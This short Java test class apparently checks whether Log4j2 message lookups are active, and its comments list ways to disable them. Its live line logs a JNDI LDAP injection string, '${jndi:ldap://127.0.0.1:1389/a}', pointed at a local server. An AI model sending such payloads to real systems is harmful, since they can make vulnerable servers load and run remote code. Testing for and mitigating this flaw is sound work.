package com.benson;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class Tmp {

    private static Logger LOG = LoggerFactory.getLogger(Tmp.class);

    public static void main(String[] args) {

        // vm args -Dlog4j2.formatMsgNoLookups=false
        // add config file log4j2.component.properties in classpath with content : log4j2.formatMsgNoLookups=true
        // add env : LOG4J_FORMAT_MSG_NO_LOOKUPS=true

        //LOG.info("${sys:user.home}");
        LOG.error("${jndi:ldap://127.0.0.1:1389/a}");
        //LOG.info("${jndi:date}");
        //LOG.error("${jndi:date}");
    }
}
